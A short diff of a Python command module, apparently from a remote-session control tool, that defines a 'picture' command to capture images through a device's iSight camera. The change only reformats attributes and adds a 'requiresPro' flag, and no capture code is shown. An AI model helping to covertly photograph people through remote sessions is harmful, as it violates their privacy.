@@ -7,10 +7,11 @@ import modules.helper as h
 
 class command:
     def __init__(self):
-        self.name = "picture"
-        self.description = "take picture through iSight"
-        self.type = "native"
-        self.usage = "Usage: picture front|back"
+        self.name         = "picture"
+        self.description  = "take picture through iSight"
+        self.type         = "native"
+        self.usage        = "Usage: picture front|back"
+        self.requiresPro  = True
 
     def run(self, session, cmd_data):
         if not cmd_data['args'] or (cmd_data['args'] != "front" and cmd_data['args'] != "back"):
